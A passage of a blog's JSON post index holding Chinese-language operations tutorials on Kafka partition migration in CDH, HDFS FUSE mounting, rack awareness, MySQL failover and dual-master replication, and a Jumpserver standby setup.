~&#x2F;Downloads&#x2F;add_replication.json --executeCurrent partition replica assignment&#123;&quot;version&quot;:1,&quot;partitions&quot;:[&#123;&quot;topic&quot;:&quot;node_log&quot;,&quot;partition&quot;:0,&quot;replicas&quot;:[2]&#125;]&#125;Save this to use as the --reassignment-json-file option during rollbackSuccessfully started reassignment of partitions &#123;&quot;version&quot;:1,&quot;partitions&quot;:[&#123;&quot;topic&quot;:&quot;node_log&quot;,&quot;partition&quot;:0,&quot;replicas&quot;:[0,1,2]&#125;]&#125; 查看执行的状态123$ kafka-reassign-partitions.sh --zookeeper localhost:2181 --reassignment-json-file ~&#x2F;Downloads&#x2F;add_replication.json --verifyStatus of partition reassignment:Reassignment of partition [node_log,0] completed successfully 如果遇到下面的错误很有可能是json文件格式有错误，仔细检查修正重新运行即可12345Partitions reassignment failed due to Partition reassignment data file add_replication.json is emptykafka.common.AdminCommandFailedException: Partition reassignment data file add_replication.json is empty at kafka.admin.ReassignPartitionsCommand$.executeAssignment(ReassignPartitionsCommand.scala:120) at kafka.admin.ReassignPartitionsCommand$.main(ReassignPartitionsCommand.scala:52) at kafka.admin.ReassignPartitionsCommand.main(ReassignPartitionsCommand.scala) 验证副本replication123$ kafka-topics.sh --describe --zookeeper localhost:2181 --topic node_logTopic:node_log PartitionCount:1 ReplicationFactor:2 Configs:Topic: node_log Partition: 0 Leader: 0 Replicas: 0,1,2 Isr: 1,0,2 参考：birdben","categories":[],"tags":[{"name":"Topic","slug":"Topic","permalink":"https://garywu520.github.io/tags/Topic/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"KAFKA","slug":"KAFKA","permalink":"https://garywu520.github.io/tags/KAFKA/"},{"name":"分区","slug":"分区","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%8C%BA/"},{"name":"Replication","slug":"Replication","permalink":"https://garywu520.github.io/tags/Replication/"}]},{"title":"KAFKA扩容节点和分区迁移-CDH","slug":"KAFKA扩容节点和分区迁移-CDH","date":"2018-12-06T09:12:39.000Z","updated":"2018-12-07T04:31:51.596Z","comments":true,"path":"2018/12/06/KAFKA扩容节点和分区迁移-CDH/","link":"","permalink":"https://garywu520.github.io/2018/12/06/KAFKA%E6%89%A9%E5%AE%B9%E8%8A%82%E7%82%B9%E5%92%8C%E5%88%86%E5%8C%BA%E8%BF%81%E7%A7%BB-CDH/","excerpt":"12由于服务器老化原因，需要迁移CDH KAFKA集群中的一台服务器，上面运行有KAFKA服务，假设broker id为536假设老化服务器IP地址是10.0.0.200 CDH新增KAFKA节点123(1)通过CDH 管理界面在KAFKA集群上新增一个KAFKA角色,并启动KAFKA服务,假设broker id为577 。(2)停用并删除集群中10.0.0.200上的KAFKA角色(3)查看现有KAFKA集群节点的 Kafka broker id，假设为(535,577) CDH新增KAFKA节点后，若出现启动错误 123请检查如下配置： （1）JDK版本是否与其他KAFKA节点版本一致，不一致则需要升级 (2) 若启动日志扔报错，需要检查CDH管理页面，新增kafka节点的配置是否与其他正常节点一致，尤其是参数Java Heap Size of Broker in Megabytes这两个参数，如果设置为0，则会导致启动KAFKA服务失败。","text":"12由于服务器老化原因，需要迁移CDH KAFKA集群中的一台服务器，上面运行有KAFKA服务，假设broker id为536假设老化服务器IP地址是10.0.0.200 CDH新增KAFKA节点123(1)通过CDH 管理界面在KAFKA集群上新增一个KAFKA角色,并启动KAFKA服务,假设broker id为577 。(2)停用并删除集群中10.0.0.200上的KAFKA角色(3)查看现有KAFKA集群节点的 Kafka broker id，假设为(535,577) CDH新增KAFKA节点后，若出现启动错误 123请检查如下配置： （1）JDK版本是否与其他KAFKA节点版本一致，不一致则需要升级 (2) 若启动日志扔报错，需要检查CDH管理页面，新增kafka节点的配置是否与其他正常节点一致，尤其是参数Java Heap Size of Broker in Megabytes这两个参数，如果设置为0，则会导致启动KAFKA服务失败。 查看Topic在有权限的服务器上，查看所有的Topic列表 1bin&#x2F;kafka-topics.sh --zookeeper 10.0.0.133:2181 --describe --list 查看具体某个Topic分区情况 1bin&#x2F;kafka-topics.sh --zookeeper 10.0.0.133:2181 --describe --topic time 12345Topic:time PartitionCount:2 ReplicationFactor:2 Configs:Topic: time Partition: 0 Leader: 535 Replicas: 535,536 Isr: 535,536Topic: time Partition: 1 Leader: 536 Replicas: 536,535 Isr: 536,535可以看到，虽然新KAFKA节点已经加入了集群，但已有的Topic分区不会自动复制到新KAFKA节点，故需要进行分区迁移 创建要迁移的Topic列表123[在有权限执行查看topic命令的机器上操作]新建文件topics-to-move.json，其中, 包含要迁移到Topic列表。这里只迁移了一个Topic，也可以是多个Topic。 12345678910mkdir -p partnervim partner&#x2F;topics-to-move.json内容：&#123; &quot;topics&quot;: [ &#123;&quot;topic&quot;: &quot;time&quot;&#125; ], &quot;version&quot;: 1&#125; 生成Topic分区分配表1使用kafka-reassign-partitions命令生成分区分配表，其中需要指定topics-to-move.json文件和迁移目标节点的broker id 1bin&#x2F;kafka-reassign-partitions.sh --zookeeper 10.0.0.133:2181 --topics-to-move-json-file .&#x2F;partner&#x2F;topics-to-move.json --broker-list &quot;535,577&quot; --generate 1234567结果如下：Current partition replica assignment&#123;&quot;version&quot;:1,&quot;partitions&quot;:[&#123;&quot;topic&quot;:&quot;time&quot;,&quot;partition&quot;:1,&quot;replicas&quot;:[535,536]&#125;,&#123;&quot;topic&quot;:&quot;ktime_log&quot;,&quot;partition&quot;:0,&quot;replicas&quot;:[536,535]&#125;]&#125;Proposed partition reassignment configuration&#123;&quot;version&quot;:1,&quot;partitions&quot;:[&#123;&quot;topic&quot;:&quot;time&quot;,&quot;partition&quot;:1,&quot;replicas&quot;:[535,577]&#125;,&#123;&quot;topic&quot;:&quot;ktime_log&quot;,&quot;partition&quot;:0,&quot;replicas&quot;:[577,535]&#125;]&#125; 12345注： (1)将Current partition replica assignment部分的内容保存到rollback-cluster-reassignment.json，用于回滚操作。 (2)将Proposed partition reassignment configuration 的内容保存到expand-cluster-reassignment.json，用于执行迁移操作。 保存完毕，可以手工编辑expand-cluster-reassignment.json 文件来更改replica 和partition 配置。 执行迁移操作1bin&#x2F;kafka-reassign-partitions.sh --zookeeper 10.0.0.133:2181 --reassignment-json-file partner&#x2F;expand-cluster-reassignment.json --execute 12345678注：迁移操作会将指定Topic 的数据文件移动到新的节点目录下，这个过程可能需要等待很长时间，视Topic 的数据量而定。执行结果如下：Current partition replica assignment&#123;&quot;version&quot;:1,&quot;partitions&quot;:[&#123;&quot;topic&quot;:&quot;time&quot;,&quot;partition&quot;:1,&quot;replicas&quot;:[535,536]&#125;,&#123;&quot;topic&quot;:&quot;time&quot;,&quot;partition&quot;:0,&quot;replicas&quot;:[536,535]&#125;]&#125;Save this to use as the --reassignment-json-file option during rollbackSuccessfully started reassignment of partitions &#123;&quot;version&quot;:1,&quot;partitions&quot;:[&#123;&quot;topic&quot;:&quot;time&quot;,&quot;partition&quot;:1,&quot;replicas&quot;:[535,577]&#125;,&#123;&quot;topic&quot;:&quot;time&quot;,&quot;partition&quot;:0,&quot;replicas&quot;:[577,535]&#125;]&#125; 验证迁移是否成功 123456bin&#x2F;kafka-reassign-partitions.sh --zookeeper 10.0.0.133:2181 --reassignment-json-file partner&#x2F;expand-cluster-reassignment.json --verify执行结果如下：Status of partition reassignment:Reassignment of partition [time,1] completed successfullyReassignment of partition [time,0] completed successfully 1234567迁移状态有两种：in progress 表示正在迁移completed successlly 表示已经成功完成迁移。如果命令出错或者遇到异常，分配状态会变成“failed” ；如果是json配置文件的原因，命令行就会打印出error日志；如果是kafka内部错误可以查看kafka的server.log 日志文件等注：在此过程中，可以在各个Kafka 的节点上使用iftop 工具实时监控网络带宽。如果数据量较大，会占用大量带宽来完成数据同步。 查看topic详情-再次确认迁移 1bin&#x2F;kafka-topics.sh --zookeeper 10.0.0.133:2181 --describe --topic time 12345Topic:time PartitionCount:2 ReplicationFactor:2 Configs:Topic: time Partition: 0 Leader: 535 Replicas: 535,577 Isr: 535,577Topic: time Partition: 1 Leader: 577 Replicas: 577,535 Isr: 535,577可以看到，原已有的topic 分区数据已经到了新KAFKA节点上。 排错1234如果某个KFAKA节点已经down掉，而Kafka分区唯一副本恰好在这个节点上，那么执行如上的热迁移分区命令，会一直卡在“in progress表示正在迁移“状态，而不会报错。而在此情况下，直接进行下一个分区热迁移，会报如下错误：kafka.common.AdminCommandFailedException: Partition reassignment currently in progress for Map(). Aborting operation 解决方法： 1问题原因是：KAFKA节点down，分区热迁移导致zk上自动创建了&#x2F;admin&#x2F;reassign_partitions，这个残留文件，会导致正常的reassigin都没办法进行，于是只能命令行登陆zk，直接删除该节点 zookeeper连接server 1bin&#x2F;zkCli.sh -server 10.0.0.133:2181 123456789101112131415161718[zk: localhost:2181(CONNECTED) 0] ls &#x2F;[zookeeper, admin, consumers, config, controller, brokers, controller_epoch][zk: localhost:2181(CONNECTED) 1] ls &#x2F;admin&#x2F;reassign_partitions[][zk: localhost:2181(CONNECTED) 2] get &#x2F;admin&#x2F;reassign_partitions&#123;&quot;version&quot;:1,&quot;partitions&quot;:[]&#125;cZxid &#x3D; 0xd00008216ctime &#x3D; Mon Oct 26 14:47:30 CST 2015mZxid &#x3D; 0xd00008216mtime &#x3D; Mon Oct 26 14:47:30 CST 2015pZxid &#x3D; 0xd00008216cversion &#x3D; 0dataVersion &#x3D; 0aclVersion &#x3D; 0ephemeralOwner &#x3D; 0x0dataLength &#x3D; 29numChildren &#x3D; 0[zk: localhost:2181(CONNECTED) 3] rmr &#x2F;admin&#x2F;reassign_partitions","categories":[],"tags":[{"name":"Topic","slug":"Topic","permalink":"https://garywu520.github.io/tags/Topic/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"KAFKA","slug":"KAFKA","permalink":"https://garywu520.github.io/tags/KAFKA/"},{"name":"分区热迁移","slug":"分区热迁移","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%8C%BA%E7%83%AD%E8%BF%81%E7%A7%BB/"}]},{"title":"Fuse挂载HDFS磁盘到本地","slug":"Fuse挂载HDFS磁盘到本地","date":"2018-12-04T03:38:18.000Z","updated":"2018-12-04T03:50:42.884Z","comments":true,"path":"2018/12/04/Fuse挂载HDFS磁盘到本地/","link":"","permalink":"https://garywu520.github.io/2018/12/04/Fuse%E6%8C%82%E8%BD%BDHDFS%E7%A3%81%E7%9B%98%E5%88%B0%E6%9C%AC%E5%9C%B0/","excerpt":"安装fuse 1yum -y install hadoop-hdfs-fuse","text":"安装fuse 1yum -y install hadoop-hdfs-fuse 创建挂载点 1mkdir -p &#x2F;mnt&#x2F;hdfs 挂载HDFS 123挂载格式：hadoop-fuse-dfs hdfs:&#x2F;&#x2F;&lt;hdfs路径&gt; &#x2F;mnt&#x2F;hdfshadoop-fuse-dfs hdfs:&#x2F;&#x2F;&#x2F; &#x2F;mnt&#x2F;hdfs 自动挂载(慎用,了解方法即可) 12vim &#x2F;etc&#x2F;fstab 添加如下行dfs:&#x2F;&#x2F;fuse_dfs &#x2F;mnt&#x2F;hdfs fuse usetrash,rw 0 0 查看挂载 1df -h","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"fuse","slug":"fuse","permalink":"https://garywu520.github.io/tags/fuse/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"hadoop-fuse-dfs","slug":"hadoop-fuse-dfs","permalink":"https://garywu520.github.io/tags/hadoop-fuse-dfs/"},{"name":"HDFS挂载","slug":"HDFS挂载","permalink":"https://garywu520.github.io/tags/HDFS%E6%8C%82%E8%BD%BD/"}]},{"title":"CDH集成配置KAFKA","slug":"CDH集成配置KAFKA","date":"2018-11-29T08:25:37.000Z","updated":"2018-11-29T09:26:55.332Z","comments":true,"path":"2018/11/29/CDH集成配置KAFKA/","link":"","permalink":"https://garywu520.github.io/2018/11/29/CDH%E9%9B%86%E6%88%90%E9%85%8D%E7%BD%AEKAFKA/","excerpt":"查看CDH Web页面中当前集群已分配的parcel包1主机 ---&gt; Parcel ---&gt; 如图","text":"查看CDH Web页面中当前集群已分配的parcel包1主机 ---&gt; Parcel ---&gt; 如图 加载KAFKA包1假设KAFKA parcel包未加载，就在此Web页面点击下载 或者 1234访问Cloudera官方Kafka组件的parcel包下载地址为：&lt;http:&#x2F;&#x2F;archive.cloudera.com&#x2F;kafka&#x2F;parcels&#x2F;latest&#x2F;照旧下载 percel 文件，以及该文件的 sha1 串，然后把xxx.sha1重命名为xxx.sha即可，最后将下载好以上两个文件后，放到 cm-server节点的 &#x2F;opt&#x2F;cloudera&#x2F;parcel-repo&#x2F; 目录下 完成后，无需重启 server 守护进程，在Web页面点击刷新即可进行分配、激活。 集群内安装KAFKA服务1主页 ---&gt; Cluster1 ---&gt; 添加服务(如图) 123456根据添加服务向导配置即可。 在此过程中，需要注意一下几个配置,具体按需设置： (1)复制进程，默认为1，修改为 3（视业务量而定） (2)分区数，默认分区数为 50，这里暂且保留。 (3)删除旧topic，默认打开，不做更改。 配置 HDFS LZO 压缩12345LZO 功能也是封装在单独的 parcel包中，选择对应平台的包。 下载地址为：http:&#x2F;&#x2F;archive-primary.cloudera.com&#x2F;gplextras&#x2F;parcels&#x2F;latest&#x2F; 这里并没有直接的提供 sha 文件，所以需要查看 manifest.json 文件，找到对应 parcel 包的 hash 值，手动保存至本地文件即可。下载后，存放至 cm-server 的 &#x2F;opt&#x2F;cloudera&#x2F;parcel-repo&#x2F; 目录下。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"KAFKA","slug":"KAFKA","permalink":"https://garywu520.github.io/tags/KAFKA/"},{"name":"parcel","slug":"parcel","permalink":"https://garywu520.github.io/tags/parcel/"},{"name":"HDFS LZO","slug":"HDFS-LZO","permalink":"https://garywu520.github.io/tags/HDFS-LZO/"}]},{"title":"为CDH/CM集群配置机架感知","slug":"为CDH-CM集群配置机架感知","date":"2018-11-29T06:40:51.000Z","updated":"2018-11-30T10:58:37.695Z","comments":true,"path":"2018/11/29/为CDH-CM集群配置机架感知/","link":"","permalink":"https://garywu520.github.io/2018/11/29/%E4%B8%BACDH-CM%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE%E6%9C%BA%E6%9E%B6%E6%84%9F%E7%9F%A5/","excerpt":"什么是CDH机架感知1机架感知是一种计算不同计算节点之间距离的技术，用以在任务调度过程中尽量减少网络带宽资源的消耗，除此之外，NameNode通过机架感知，可以确定每个DataNode所属的机架ID，优化数据副本存放策略。 1Hadoop作为典型的大数据处理平台，为充分发挥数据本地性的优势，避免数据跨网络传输，优化集群网络带宽资源，最大程度发挥Hadoop的性能，通常会为Hadoop集群配置机架感知，要为Hadoop集群配置机架感知，需要提前知道Hadoop集群的网络拓扑结构。一般来说，配置机架感知就是将逻辑机架和物理机架一一对应。","text":"什么是CDH机架感知1机架感知是一种计算不同计算节点之间距离的技术，用以在任务调度过程中尽量减少网络带宽资源的消耗，除此之外，NameNode通过机架感知，可以确定每个DataNode所属的机架ID，优化数据副本存放策略。 1Hadoop作为典型的大数据处理平台，为充分发挥数据本地性的优势，避免数据跨网络传输，优化集群网络带宽资源，最大程度发挥Hadoop的性能，通常会为Hadoop集群配置机架感知，要为Hadoop集群配置机架感知，需要提前知道Hadoop集群的网络拓扑结构。一般来说，配置机架感知就是将逻辑机架和物理机架一一对应。 HDFS副本存放策略1HDFS最经典的副本存放策略就是“3副本策略”，其使用的是BlockPlacementPolicyDefault策略类。 BlockPlacementPolicyDefault策略类–主要内容如下： 123456第一个: 副本放在发起写请求的客户端上。 【如果客户端不在集群内，即不是Datanode，那么会随机选取一个Datanode存放】第二个: 副本放在与第一个副本所在节点的不同机架上；第三个: 副本放在与第二个副本所在节点的同一机架的不同节点上。注：如果还有更多的副本，则随机选取节点存放。 Web界面-配置机架感知1配置机架感知需要人为地告诉Namenode哪台Datanode位于哪个机架下，将真实的网络拓朴和机架信息了解清楚后，通过机架感知脚本将机器的IP地址正确的映射到相应的机架上去，使逻辑机架与物理机架保持一致。 1默认情况下，机架感知是没有启用的,这时任何一台 Datanode 节点，不管物理上是否属于同一个机架，Namenode 都会默认将他们划分到&#x2F;default-rack下。 CM管理界面-配置机架感知1主机 ---&gt; 选中主机 ---&gt; 点击“已选中的操作” ---&gt; 分配机架 让变更生效1若要使机架感知变更生效，需要重启所有namenode服务【重启1个，服务恢复后，观察无异常，再重启另一个节点】 编辑文件-配置机架感知123默认情况下，namenode启动时候日志是这样的：INFO org.apache.hadoop.net.NetworkTopology: Adding a new node: &#x2F;default-rack&#x2F; 172.16.145.35:50010每个IP 对应的机架ID都是 &#x2F;default-rack ，说明hadoop的机架感知没有被启用。 1要将hadoop机架感知的功能启用，配置非常简单: 编辑NameNode所在节点的&#x2F;etc&#x2F;hadoop&#x2F;conf下的core-site.xml 文件 1234567891011cat &#x2F;etc&#x2F;hadoop&#x2F;conf&#x2F;core-site.xml&lt;property&gt;&lt;name&gt;topology.script.file.name&lt;&#x2F;name&gt;&lt;value&gt;&#x2F;etc&#x2F;hadoop&#x2F;conf&#x2F;RackAware.py&lt;&#x2F;value&gt;&lt;&#x2F;property&gt;这个配置选项的value指定为一个可执行程序，通常为一个脚本，该脚本接受一个参数，输出一个值。接受的参数通常为某台datanode机器的ip地址，而输出的值通常为该ip地址对应的datanode所在的rack，例如”&#x2F;rack1”。Namenode启动时，会判断该配置选项是否为空，如果非空，则表示已经启用机架感知的配置，此时namenode会根据配置寻找该脚本，并在接收到每一个datanode的heartbeat时，将该datanode的ip地址作为参数传给该脚本运行，并将得到的输出作为该datanode所属的机架ID，保存到内存的一个map中. 1真正作用于机架感知的配置文件位于目录： &#x2F;etc&#x2F;hadoop&#x2F;conf目录下的 topology.map文件，编辑修改即可。[所有namenode节点都需要变更]，修改完毕后，重启所有namenode节点 验证机架感知使用HDFS命令打印CDH集群机架信息 1# sudo -u hdfs hdfs dfsadmin -printTopology 参考：云社区","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"CDH","slug":"CDH","permalink":"https://garywu520.github.io/tags/CDH/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"HDFS","slug":"HDFS","permalink":"https://garywu520.github.io/tags/HDFS/"},{"name":"CM","slug":"CM","permalink":"https://garywu520.github.io/tags/CM/"},{"name":"Hadoop","slug":"Hadoop","permalink":"https://garywu520.github.io/tags/Hadoop/"},{"name":"机架感知","slug":"机架感知","permalink":"https://garywu520.github.io/tags/%E6%9C%BA%E6%9E%B6%E6%84%9F%E7%9F%A5/"},{"name":"Rack","slug":"Rack","permalink":"https://garywu520.github.io/tags/Rack/"}]},{"title":"MySQL主从切换步骤","slug":"MySQL主从切换步骤","date":"2018-11-29T03:00:35.000Z","updated":"2018-11-29T03:08:51.603Z","comments":true,"path":"2018/11/29/MySQL主从切换步骤/","link":"","permalink":"https://garywu520.github.io/2018/11/29/MySQL%E4%B8%BB%E4%BB%8E%E5%88%87%E6%8D%A2%E6%AD%A5%E9%AA%A4/","excerpt":"","text":"适用场景 1MySQL一主一丛环境，主库意外宕机，从库提升为主库 步骤 1234(1)确认服务器已经完成所有同步操作 mysql&gt; stop slave io_thread; mysql&gt; show processlist; 直到看到状态都为 XXX has read all relay log 表示从库更新均执行完毕 12(2)停止从服务器slave服务 mysql&gt; stop slave; 12(3) 将从服务器切换为主服务器 mysql&gt; reset master; 12(4) 检查新主库是否支持写入操作，若不能写入，需要将数据库设为可读写 mysql&gt; set global read_only&#x3D;0; #关闭数据库只读属性","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"MySQL主从切换","slug":"MySQL主从切换","permalink":"https://garywu520.github.io/tags/MySQL%E4%B8%BB%E4%BB%8E%E5%88%87%E6%8D%A2/"},{"name":"MySQL从提升为主","slug":"MySQL从提升为主","permalink":"https://garywu520.github.io/tags/MySQL%E4%BB%8E%E6%8F%90%E5%8D%87%E4%B8%BA%E4%B8%BB/"}]},{"title":"Jumpserver1.4.3备机-部署概要","slug":"Jumpserver1-4-3备机-部署概要","date":"2018-11-28T11:21:25.000Z","updated":"2018-11-28T11:23:32.080Z","comments":true,"path":"2018/11/28/Jumpserver1-4-3备机-部署概要/","link":"","permalink":"https://garywu520.github.io/2018/11/28/Jumpserver1-4-3%E5%A4%87%E6%9C%BA-%E9%83%A8%E7%BD%B2%E6%A6%82%E8%A6%81/","excerpt":"说明12应用场景：防止Jumpserver挂掉后，数据丢失适用于Jumpserver版本：V1.4.3","text":"说明12应用场景：防止Jumpserver挂掉后，数据丢失适用于Jumpserver版本：V1.4.3 备机思路：1234567891011(1) 完整部署一套备机(2) 【mysql采用单机模式】将主jumpserver数据库备份并scp到备机导入【提前建立主机SSH互信】 MySQL主从模式经测试无效,会导致jumpserver及coco组件启动错误。 mysqldump -uroot -p --databases jumpserver &gt;&#x2F;opt&#x2F;jumpserver_15.sql mysql -uroot -p -e &quot;use jumpserver;source &#x2F;opt&#x2F;jumpserver_15.sql;&quot;(3) 备份jumpserver和coco目录并scp到Jumpserver备机&#x2F;opt&#x2F;目录下覆盖同名目录。 主: &#x2F;opt&#x2F;jumpserver 覆盖到 备:&#x2F;opt&#x2F;jumpserver 主: &#x2F;opt&#x2F;coco 覆盖到 备:&#x2F;opt&#x2F;coco 修改jumpserver和coco配置文件，把主的IP更新为备机IP，最后启动服务 手动操作的问题：问题1： 12345678重新接受coco注册【备机手动操作】 保证jumpserver正常启动情况下进行如下操作： (1）kill掉cocod的进程 （2）rm &#x2F;opt&#x2F;coco&#x2F;keys&#x2F;.access_key (3)网页版清除已有的注册 (4) .&#x2F;cocod start -d (5) 刷新备机jumpserver网页，在会话管理--终端管理，手动接受coco注册，使其服务正常即可。 问题2： 1备机JumpServer在正式使用时，需将 系统设置 -- 基本设置 -- 当前站点URL的IP地址更正为备机IP","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Jumpserver","slug":"Jumpserver","permalink":"https://garywu520.github.io/tags/Jumpserver/"},{"name":"备机部署","slug":"备机部署","permalink":"https://garywu520.github.io/tags/%E5%A4%87%E6%9C%BA%E9%83%A8%E7%BD%B2/"}]},{"title":"MySQL双主复制架构","slug":"MySQL双主架构-数据同步","date":"2018-11-28T10:43:46.000Z","updated":"2018-11-28T11:02:34.332Z","comments":true,"path":"2018/11/28/MySQL双主架构-数据同步/","link":"","permalink":"https://garywu520.github.io/2018/11/28/MySQL%E5%8F%8C%E4%B8%BB%E6%9E%B6%E6%9E%84-%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5/","excerpt":"说明123本双主架构应用场景：多主单写，避免了主键冲突问题。当Master1节点挂了，直接将数据写入Master2节点，无需变更配置文件即可具有写入权限。另外，双主架构不能同步mysql库，也就意味着，所有的账号及权限，需要同时在Master2上再次创建 环境1234Master1: 10.0.10.101Master2: 10.0.10.102Master1与Master2双向同步 部署123Mysql版本：5.6.42安装方式：编译安装编译安装过程：略","text":"说明123本双主架构应用场景：多主单写，避免了主键冲突问题。当Master1节点挂了，直接将数据写入Master2节点，无需变更配置文件即可具有写入权限。另外，双主架构不能同步mysql库，也就意味着，所有的账号及权限，需要同时在Master2上再次创建 环境1234Master1: 10.0.10.101Master2: 10.0.10.102Master1与Master2双向同步 部署123Mysql版本：5.6.42安装方式：编译安装编译安装过程：略 1. 修改master1上mysql配置文件my.conf123456789101112131415161718192021222324252627[mysqld]server-id &#x3D; 101 #定义数据库唯一IDbind-address &#x3D; 10.0.10.101log_bin &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql-5.6.42&#x2F;data&#x2F;mysql-bin.log#启用二进制日志 如果没有var&#x2F;log&#x2F;mysql这个目录，则需要创建.#binlog-do-db &#x3D; tudou1 #binlog-do-db &#x3D; tudou2#指定需要同步的数据库,这里同步tudou1和tudou2两个数据库binlog-ignore-db &#x3D; mysql #忽略同步的数据库（双主，务必忽略同步此库）log-slave-updates &#x3D; 1 #把从库的写操作记录到binlog中 （缺少之后，双主创建失败）expire_logs_days &#x3D; 10#日志文件过期天数auto-increment-increment&#x3D; 2 #设定为主服务器的数量，防止auto_increment字段重复auto-increment-offset &#x3D; 1 #自增长字段的初始值 创建账号并授权 12345mysql&gt; GRANT REPLICATION SLAVE ON *.* TO &#39;repl&#39;@&#39;10.0.10.102&#39; IDENTIFIED BY &#39;repl123&#39;;mysql&gt; flush privileges;在102测试连接mysql -urepl -p -h10.0.10.101 2. 修改master2上mysql配置文件my.conf123456789101112131415161718192021222324252627[mysqld]server-id &#x3D; 102 #数据库唯一ID, 与master1不同bind-address &#x3D; 10.0.10.101log_bin &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql-5.6.42&#x2F;data&#x2F;mysql-bin.log #启用二进制日志 如果没有var&#x2F;log&#x2F;mysql这个目录，则需要创建.#binlog-do-db &#x3D; tudou1 #binlog-do-db &#x3D; tudou2#需要同步的数据库,这里同步tudou1和tudou2两个数据库binlog-ignore-db &#x3D; mysql #忽略同步的数据库（双主，务必忽略同步此库）log-slave-updates &#x3D; 1 #把从库的写操作记录到binlog中 （缺少之后，双主创建失败）expire_logs_days &#x3D; 10 #日志文件过期天数auto-increment-increment&#x3D; 2 #设定为主服务器的数量，防止auto_increment字段重复auto-increment-offset &#x3D; 2 #自增长字段的初始值，与master1不同 创建账号并授权 12345mysql&gt; GRANT REPLICATION SLAVE ON *.* TO &#39;repl&#39;@&#39;10.0.10.101&#39; IDENTIFIED BY &#39;repl123&#39;;mysql&gt; flush privileges;在101测试连接mysql -urepl -p -h10.0.10.102 配置双主-双方向数据同步查看Master1的 Position和Binlog File12101# mysql -uroot -pmysql&gt; show master status; 查看Master2的 Position和Binlog File12102# mysql -uroot -pmysql&gt; show master status; 在Master1上启用同步12345678910mysql&gt; CHANGE MASTER TO MASTER_HOST&#x3D;&#39;10.0.10.102&#39;, MASTER_USER&#x3D;&#39;repl&#39;, MASTER_PASSWORD&#x3D;&#39;repl123&#39;, MASTER_PORT&#x3D;3306, MASTER_LOG_FILE&#x3D;&#39;mysql-bin.000001&#39;, MASTER_LOG_POS&#x3D;417; mysql&gt; START SLAVE;mysql&gt; SHOW SLAVE STATUS\\G 123如出现以下两项，则说明配置成功！Slave_IO_Running: YesSlave_SQL_Running: Yes 在master2上启用同步12345678910mysql&gt; CHANGE MASTER TO MASTER_HOST&#x3D;&#39;10.0.10.101&#39;, MASTER_USER&#x3D;&#39;repl&#39;, MASTER_PASSWORD&#x3D;&#39;repl123&#39;, MASTER_PORT&#x3D;3306, MASTER_LOG_FILE&#x3D;&#39;mysql-bin.000001&#39;, MASTER_LOG_POS&#x3D;501; mysql&gt; START SLAVE;mysql&gt; SHOW SLAVE STATUS\\G 123如出现以下两项，则说明配置成功！Slave_IO_Running: YesSlave_SQL_Running: Yes 验证双主同步在Master1 创建一个测试数据库和表1234567891011121314151617181920212223242526mysql&gt; create database crm;Query OK, 1 row affected (0.00 sec)mysql&gt; use crm;Database changedmysql&gt; create table employee(id int auto_increment,name varchar(10),primary key(id));Query OK, 0 rows affected (0.00 sec)mysql&gt; insert into employee(name) values(&#39;a&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; insert into employee(name) values(&#39;b&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; insert into employee(name) values(&#39;c&#39;);Query OK, 1 row affected (0.06 sec)mysql&gt; select * from employee;+----+------+| id | name |+----+------+| 1 | a || 3 | b || 5 | c |+----+------+3 rows in set (0.00 sec) 进入master2，查看是否有crm这个数据库和employee表1234567891011121314151617181920212223242526272829303132333435363738394041424344454647ysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || crm || mysql || performance_schema |+--------------------+4 rows in set (0.00 sec)mysql&gt; use crm;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+---------------+| Tables_in_crm |+---------------+| employee |+---------------+1 row in set (0.00 sec)mysql&gt; select * from employee;+----+------+| id | name |+----+------+| 1 | a || 3 | b || 5 | c |+----+------+3 rows in set (0.00 sec)mysql&gt; insert into employee(name) values(&#39;d&#39;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from employee;+----+------+| id | name |+----+------+| 1 